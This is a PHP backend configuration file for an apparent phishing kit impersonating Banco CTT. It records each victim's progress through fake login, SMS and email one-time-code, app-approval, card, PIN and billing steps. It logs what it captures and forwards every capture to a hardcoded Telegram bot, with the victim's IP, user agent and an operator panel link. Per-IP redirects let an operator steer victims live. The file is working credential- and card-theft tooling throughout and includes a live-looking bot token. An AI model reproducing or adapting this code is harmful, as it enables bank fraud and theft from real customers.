<?php
// ============================================================
//  config.php — Shared backend for Banco CTT kit
//  
// ============================================================

// ---- Constants ----
define('CAPTURES_FILE',     __DIR__ . '/captures.log');
define('SETTINGS_FILE',     __DIR__ . '/settings.json');
define('IP_REDIRECTS_FILE', __DIR__ . '/ip_redirects.json');
define('STATE_DIR',         __DIR__ . DIRECTORY_SEPARATOR . 'states');
define('PANEL_BASE_URL',    (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . dirname($_SERVER['SCRIPT_NAME'] ?? '/'));

// Telegram
define('TG_BOT_TOKEN', '7802168968:AAHpz2nbyybeIhcdMRBtwLTnme49QCIehYY');
define('TG_CHAT_ID',   '-5121800974');

// All valid steps (approve added)
$GLOBALS['VALID_STEPS'] = array('login', 'sms', 'emailotp', 'approve', 'card', 'pin', 'billing');

// ---- Ensure runtime dirs exist ----
if (!is_dir(STATE_DIR)) {
    @mkdir(STATE_DIR, 0777, true);
    @chmod(STATE_DIR, 0777);
}
if (!is_dir(STATE_DIR)) {
    die('<b>Config error:</b> Cannot create state directory. Please create <code>' . htmlspecialchars(STATE_DIR) . '</code> manually and set write permissions.');
}

// ============================================================
//  Client IP
// ============================================================
function client_ip() {
    $keys = array('HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR');
    foreach ($keys as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

// ============================================================
//  Safe input
// ============================================================
function safe_input($key) {
    if (!isset($_POST[$key])) return '';
    return trim(stripslashes($_POST[$key]));
}

// ============================================================
//  JSON response
// ============================================================
function json_response($arr) {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($arr, JSON_UNESCAPED_UNICODE);
    exit;
}

// ============================================================
//  State management (per-IP files)
// ============================================================
function state_file_path($ip) {
    // Windows does not allow colons (:) in filenames.
    $safe = preg_replace('/[^0-9a-fA-F\.\-]/', '_', $ip);
    return STATE_DIR . DIRECTORY_SEPARATOR . 'state_' . $safe . '.json';
}

function get_state($ip) {
    $f = state_file_path($ip);
    if (!file_exists($f)) return null;
    $raw = @file_get_contents($f);
    if (!$raw) return null;
    $s = json_decode($raw, true);
    if (!is_array($s)) return null;
    return $s;
}

function save_state($ip, $state) {
    $f = state_file_path($ip);
    $state['ip'] = $ip;
    file_put_contents($f, json_encode($state, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function init_state($ip, $step = 'login') {
    $existing = get_state($ip);
    if ($existing) {
        $existing['current_step'] = $step;
        $existing['last_seen'] = date('Y-m-d H:i:s');
        save_state($ip, $existing);
        return $existing;
    }
    $state = array(
        'ip'           => $ip,
        'current_step' => $step,
        'action'       => 'wait',
        'destination'  => null,
        'completed'    => array(),
        'data'         => array(),
        'started_at'   => date('Y-m-d H:i:s'),
        'last_seen'    => date('Y-m-d H:i:s')
    );
    save_state($ip, $state);
    return $state;
}

function update_state_step($ip, $step, $data) {
    $state = get_state($ip);
    if (!$state) $state = init_state($ip, $step);
    $state['current_step'] = $step;
    $state['action'] = 'wait';
    $state['destination'] = null;
    $state['completed'][$step] = true;
    $state['data'][$step] = $data;
    $state['last_seen'] = date('Y-m-d H:i:s');
    save_state($ip, $state);
}

function consume_action($ip) {
    $state = get_state($ip);
    if (!$state) return null;
    if (!isset($state['action']) || $state['action'] !== 'go') return null;
    $dest = isset($state['destination']) ? $state['destination'] : null;
    if (empty($dest)) return null;
    $state['action'] = 'wait';
    $state['destination'] = null;
    save_state($ip, $state);
    return $dest;
}

function get_all_states() {
    $files = glob(STATE_DIR . DIRECTORY_SEPARATOR . 'state_*.json');
    $out = array();
    foreach ($files as $f) {
        $raw = @file_get_contents($f);
        if (!$raw) continue;
        $j = json_decode($raw, true);
        if (!is_array($j) || empty($j['ip'])) continue;
        $out[$j['ip']] = $j;
    }
    uasort($out, function($a, $b) {
        $ta = isset($a['last_seen']) ? strtotime($a['last_seen']) : 0;
        $tb = isset($b['last_seen']) ? strtotime($b['last_seen']) : 0;
        return $tb - $ta;
    });
    return $out;
}

function count_active_victims() {
    return count(get_all_states());
}

function delete_state($ip) {
    $f = state_file_path($ip);
    if (file_exists($f)) @unlink($f);
}

// ============================================================
//  Settings
// ============================================================
function get_settings() {
    if (!file_exists(SETTINGS_FILE)) return array();
    $raw = @file_get_contents(SETTINGS_FILE);
    $s = json_decode($raw, true);
    return is_array($s) ? $s : array();
}

function save_settings($s) {
    file_put_contents(SETTINGS_FILE, json_encode($s, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

// ============================================================
//  IP Redirects
// ============================================================
function get_ip_redirects() {
    if (!file_exists(IP_REDIRECTS_FILE)) return array();
    $raw = @file_get_contents(IP_REDIRECTS_FILE);
    $r = json_decode($raw, true);
    return is_array($r) ? $r : array();
}

function set_ip_redirect($ip, $url, $delay, $enabled) {
    $all = get_ip_redirects();
    $all[$ip] = array('url' => $url, 'delay' => (int)$delay, 'enabled' => $enabled);
    file_put_contents(IP_REDIRECTS_FILE, json_encode($all, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function disable_ip_redirect($ip) {
    $all = get_ip_redirects();
    if (isset($all[$ip])) {
        $all[$ip]['enabled'] = false;
        file_put_contents(IP_REDIRECTS_FILE, json_encode($all, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
    }
}

// ============================================================
//  Logging
// ============================================================
function log_capture($step, $ip, $data) {
    $ts = date('Y-m-d H:i:s');
    $line = "[{$ts}] [{$step}] IP={$ip} " . json_encode($data, JSON_UNESCAPED_UNICODE) . "\n";
    @file_put_contents(CAPTURES_FILE, $line, FILE_APPEND | LOCK_EX);
}

// ============================================================
//  Telegram
// ============================================================
function send_telegram_raw($text) {
    $url = 'https://api.telegram.org/bot' . TG_BOT_TOKEN . '/sendMessage';
    $payload = http_build_query(array(
        'chat_id'    => TG_CHAT_ID,
        'text'       => $text,
        'parse_mode' => 'HTML'
    ));

    $ch = curl_init($url);
    curl_setopt_array($ch, array(
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ));
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

function send_telegram_capture($step, $title, $ip, $data) {
    $ts  = date('Y-m-d H:i:s');
    $ua  = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    $lang= isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'Unknown';
    $ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct';

    $panelLink = PANEL_BASE_URL . '/admin.php?ip=' . urlencode($ip);

    $msg  = "🔐 New Banco CTT Capture\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "📍 Step: {$step} — {$title}\n";
    $msg .= "━━━━━━━━━━━━━━━\n";

    foreach ($data as $k => $v) {
        if ($v === null) continue;
        $label = ucfirst(str_replace('_', ' ', $k));
        $msg .= "🔹 {$label}: {$v}\n";
    }

    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "🌐 IP: {$ip}\n";
    $msg .= "🗣 Lang: {$lang}\n";
    $msg .= "🔗 Ref: {$ref}\n";
    $msg .= "🕒 Time: {$ts}\n";
    $msg .= "━━━━━━━━━━━━━━━\n";
    $msg .= "📱 UA: {$ua}\n";
    $msg .= "[🛂] Panel-link: {$panelLink}";

    send_telegram_raw($msg);
}

// ============================================================
//  Step label map
// ============================================================
function step_label($step) {
    $map = array(
        'login'   => 'Login',
        'sms'     => 'SMS Code',
        'emailotp'=> 'Email OTP',
        'approve' => 'App Approval',
        'card'    => 'Card Details',
        'pin'     => 'PIN Code',
        'billing' => 'Billing / Identity'
    );
    return isset($map[$step]) ? $map[$step] : ucfirst($step);
}
?>
